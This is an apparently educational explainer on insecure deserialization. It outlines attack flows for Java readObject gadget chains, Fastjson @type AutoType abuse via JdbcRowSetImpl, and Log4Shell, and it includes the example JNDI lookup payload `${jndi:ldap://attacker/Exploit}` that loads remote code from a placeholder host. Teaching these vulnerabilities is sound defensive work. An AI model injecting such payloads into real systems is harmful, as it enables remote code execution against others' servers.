# Insecure Deserialization — Vulnerability Principles

## What is Insecure Deserialization?

Insecure Deserialization occurs when an application deserializes external data into objects without adequate validation, allowing attackers to craft malicious serialized data that triggers arbitrary code execution during deserialization.

The core problem: **Applications deserialize untrusted data into objects, and deserialization automatically invokes object methods (e.g., readObject(), setters), which attackers can exploit to execute malicious code.**

---

## 1. Java Native Deserialization

`ObjectInputStream.readObject()` automatically calls the object's `readObject()` method during deserialization. If a Gadget Chain exists (e.g., VulnerableTask.readObject() auto-executes the command field), attackers can craft serialized objects with malicious commands to achieve RCE.

**Attack flow**: Find deserialization entry point → Identify gadget class → Craft malicious serialized object → Submit Base64-encoded payload → readObject() triggers RCE.

---

## 2. Fastjson Deserialization

Fastjson's `@type` field allows specifying the target class for deserialization. Fastjson <= 1.2.24 has AutoType enabled by default, automatically instantiating the specified class and calling its setters. Attackers can use `@type` to target classes with dangerous setters (e.g., JdbcRowSetImpl) to achieve JNDI injection and RCE.

**Attack flow**: Find Fastjson parsing endpoint → Identify version → Craft JSON with `@type` → Fastjson instantiates gadget → Setters trigger JNDI lookup → RCE.

---

## 3. Log4Shell

Log4j2 <= 2.14.1 processes `${jndi:ldap://...}` lookup expressions in log messages. When user input containing JNDI lookup expressions is logged, Log4j2 executes the JNDI lookup, loading remote malicious classes for RCE.

**Attack flow**: Find Log4j2 application → Locate user input that gets logged → Craft input with `${jndi:ldap://attacker/Exploit}` → Log4j2 resolves expression → JNDI lookup → RCE.
